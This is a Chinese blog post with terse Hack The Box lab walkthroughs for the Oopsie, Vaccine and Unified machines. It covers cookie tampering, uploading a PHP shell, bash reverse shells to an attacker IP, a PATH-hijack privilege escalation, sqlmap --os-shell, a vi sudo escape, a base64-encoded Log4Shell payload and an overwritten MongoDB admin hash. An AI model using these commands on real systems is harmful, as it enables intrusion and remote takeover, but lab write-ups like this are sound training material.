<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>htb(二) | wanan</title><meta name="keywords" content="CTF,htb(二)"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Oopsie  proxy   发现不是  这里可以看到 有个login  尝试发现是 &#x2F;cdn-cgi&#x2F;login    发现需要admin  Cookie    将id修改为1 34322    记得之前扫到的 &#x2F;uploads目录    db.php  &#x2F;bin&#x2F;bash -c &amp;#x27;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.217&#x2F;5555 0">
<meta property="og:type" content="article">
<meta property="og:title" content="htb(二)">
<meta property="og:url" content="https://www.wanan.red/8ed6b849.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="Oopsie  proxy   发现不是  这里可以看到 有个login  尝试发现是 &#x2F;cdn-cgi&#x2F;login    发现需要admin  Cookie    将id修改为1 34322    记得之前扫到的 &#x2F;uploads目录    db.php  &#x2F;bin&#x2F;bash -c &amp;#x27;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.217&#x2F;5555 0">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg">
<meta property="article:published_time" content="2023-03-11T13:15:54.296Z">
<meta property="article:modified_time" content="2023-03-11T13:23:01.382Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="htb(二)">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202303181050845.jpeg"><link rel="canonical" href="https://www.wanan.red/8ed6b849"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-FYB0HL88QE');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'htb(二)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-11 21:23:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202303181050845.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">113</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">htb(二)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-11T13:15:54.296Z" title="发表于 2023-03-11 21:15:54">2023-03-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-11T13:23:01.382Z" title="更新于 2023-03-11 21:23:01">2023-03-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/htb-%E4%BA%8C/">htb(二)</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="htb(二)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202303112117568.png" alt="image-20230213133440876"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213161714740.png" alt="image-20230213161714740"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213135928831.png" alt="image-20230213135928831"></p>
<p>发现不是</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213141213305.png" alt="image-20230213141213305"></p>
<p>这里可以看到 有个login</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213141238295.png" alt="image-20230213141238295"></p>
<p>尝试发现是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cdn-cgi/login</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213142125339.png" alt="image-20230213142125339"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213142454155.png" alt="image-20230213142454155"></p>
<p>发现需要admin</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213142437606.png" alt="image-20230213142437606"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213144246206.png" alt="image-20230213144246206"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213143552557.png" alt="image-20230213143552557"></p>
<p>将id修改为1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">34322</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213150315842.png" alt="image-20230213150315842"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213150308879.png" alt="image-20230213150308879"></p>
<p>记得之前扫到的 &#x2F;uploads目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213150351818.png" alt="image-20230213150351818"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213153334855.png" alt="image-20230213153334855"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213152316518.png" alt="image-20230213152316518"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &amp;&gt; /dev/tcp/10.10.14.217/5555 0&lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213161554470.png" alt="image-20230213161554470"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213161543646.png" alt="image-20230213161543646"></p>
<p>反弹到的shell需要把他转换成一个交互式的shell才能切换用户 设置shell为&#x2F;bin&#x2F;bash script命令可以用作交互终端会话过程记录,保存用户输入和系统输入的全过程 -q是静默执行 把会话内容丢到黑洞&#x2F;dev&#x2F;null</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213165814524.png" alt="image-20230213165814524"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213165859189.png" alt="image-20230213165859189"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213171839075.png" alt="image-20230213171839075"></p>
<p>这里可以看到文件属于root 在bugtracker因此 使用rebert执行的话就是root权限</p>
<p>查找属于这个组的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213170616598.png" alt="image-20230213170616598"></p>
<p>看一下这里的执行情况</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213170638809.png" alt="image-20230213170638809"></p>
<p>这里可以看到使用了 cat 去查看&#x2F;root目录 而且这里并没有使用 绝对路径而是使用的相对路径</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213171620700.png" alt="image-20230213171620700"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213173515365.png" alt="image-20230213173515365"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set owner User ID</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213173525135.png" alt="image-20230213173525135"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; cat</span><br><span class="line">chmod +x cat</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213174906761.png" alt="image-20230213174906761"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213175233768.png" alt="image-20230213175233768"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure>

<h1 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213202332395.png" alt="image-20230213202332395"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213201815371.png" alt="image-20230213201815371"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213202522785.png" alt="image-20230213202522785"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anonymous</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213203019945.png" alt="image-20230213203019945"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213204335936.png" alt="image-20230213204335936"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backup.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213213659560.png" alt="image-20230213213659560"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213213640031.png" alt="image-20230213213640031"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">741852963</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213214717370.png" alt="image-20230213214717370"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213214711062.png" alt="image-20230213214711062"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213214732551.png" alt="image-20230213214732551"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qwerty789</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213214925953.png" alt="image-20230213214925953"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213215428165.png" alt="image-20230213215428165"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py  --batch -r D:\Download\sql.txt --os-shell</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213234526886.png" alt="image-20230213234526886"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &amp;&gt; /dev/tcp/10.10.14.217/5555 0&lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213234801994.png" alt="image-20230213234801994"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213235119317.png" alt="image-20230213235119317"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres@10.129.56.99 password=P@s5w0rd!</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230213235511385.png" alt="image-20230213235511385"></p>
<p>使用这个登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ec9b13ca4d6229cd5cc1e09980965bf7</span><br></pre></td></tr></table></figure>

<p>发现 可以sudo执行 vi操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214001032362.png" alt="image-20230214001032362"></p>
<p>接着输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214001142263.png" alt="image-20230214001142263"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214001213136.png" alt="image-20230214001213136"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214001308723.png" alt="image-20230214001308723"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214001343919.png" alt="image-20230214001343919"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd6e058e814260bc70e9bbdef2715849</span><br></pre></td></tr></table></figure>

<h1 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214161803413.png" alt="image-20230214161803413"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22,6789,8080,8443</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214162352640.png" alt="image-20230214162352640"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UniFi Network</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214162813826.png" alt="image-20230214162813826"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.4.54</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214165700556.png" alt="image-20230214165700556"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2021-44228</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214165839332.png" alt="image-20230214165839332"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDAP</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214170322345.png" alt="image-20230214170322345"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214210255385.png" alt="image-20230214210255385"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">27117</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214213200940.png" alt="image-20230214213200940"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ace</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214214548419.png" alt="image-20230214214548419"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.admin.find()</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214220137479.png" alt="image-20230214220137479"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.admin.update() </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214220156368.png" alt="image-20230214220156368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NotACrackablePassword4U2022</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214161736277.png" alt="image-20230214161736277"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214162331459.png" alt="image-20230214162331459"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214162632027.png" alt="image-20230214162632027"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214165707058.png" alt="image-20230214165707058"></p>
<p>发现是存在log4j</p>
<p>ldap默认端口389 因此我们使用tcpdump监听一下389端口看看是否存在 jndi注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i tun0 port 389</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214175817335.png" alt="image-20230214175817335"></p>
<p>说明存在</p>
<p>直接按照 教程来执行 按照maven</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install openjdk-11-jre maven</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214170755906.png" alt="image-20230214170755906"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \</span><br><span class="line">    &amp;&amp; cd Log4jUnifi &amp;&amp; pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214171426497.png" alt="image-20230214171426497"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn package -f utils/rogue-jndi/</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214172404108.png" alt="image-20230214172404108"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar /root/Log4jUnifi/Log4jUnifi/utils/rogue-jndi/target/RogueJndi-1.1.jar -c &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICdiYXNoIC1pICY+IC9kZXYvdGNwLzEwLjEwLjE1LjgyLzU1NTUgMDwmMSc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -n 10.10.15.82</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214174939475.png" alt="image-20230214174939475"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214174956384.png" alt="image-20230214174956384"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214174949476.png" alt="image-20230214174949476"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214220655389.png" alt="image-20230214220655389"></p>
<p>列出当前运行的程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214210044509.png" alt="image-20230214210044509"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214213129488.png" alt="image-20230214213129488"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo --port 27117 ace --eval &quot;db.admin.find().forEach(printjson);&quot;</span><br></pre></td></tr></table></figure>

<p>mongodb 默认数据库ace 通过unifi条件查询语句查询ace 发现admin 账户以及密码信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214214509925.png" alt="image-20230214214509925"></p>
<p>使用hashid查询 是什么加密方式</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214214801702.png" alt="image-20230214214801702"></p>
<p>使用 mkpasswd 生成新的密码进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 admin</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214215117717.png" alt="image-20230214215117717"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$bPed3RSGDmjXpxI6$jw1OxMOC3tXznz6B/sdRBueVUT3he/NgSlTLTeeeHodsIwcdbbU39AsXLX2b/5pdOOxdodtS2X1uZeyU7.JvA.</span><br></pre></td></tr></table></figure>

<p>接着进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo --port 27117 ace --eval &#x27;db.admin.update(&#123;&quot;_id&quot;: ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot;:&quot;$6$bPed3RSGDmjXpxI6$jw1OxMOC3tXznz6B/sdRBueVUT3he/NgSlTLTeeeHodsIwcdbbU39AsXLX2b/5pdOOxdodtS2X1uZeyU7.JvA.&quot;&#125;&#125;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214215817595.png" alt="image-20230214215817595"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214220027301.png" alt="image-20230214220027301"></p>
<p>这里给了root用户的密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230214220344037.png" alt="image-20230214220344037"></p>
